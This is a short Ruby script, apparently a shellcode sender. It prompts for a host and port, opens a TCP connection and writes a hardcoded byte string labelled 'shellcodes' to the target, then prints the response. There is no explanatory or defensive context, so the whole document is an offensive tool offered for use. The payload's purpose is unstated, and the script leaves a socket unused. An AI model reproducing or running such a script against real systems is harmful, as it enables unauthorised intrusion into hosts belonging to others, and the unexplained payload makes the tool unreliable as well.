# author code : Muhammad Quwais Safutra
# from version 1.0.0 <02/15/2019>

require 'socket'

print "[?] host       "
host = gets.chomp
print "[?] port       "
port = gets.chomp

shellcodes = "\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40"+
  "\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe"+
  "\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe\xff"

puts "[+] sending the request..."
s = TCPSocket.new(host,port)
puts "[*] connected to #{host}"
puts "[+] reading data"
ss = Socket.new(:INET,:STREAM)
s.write(shellcodes)
puts s.read(100)
puts "\n[+] done"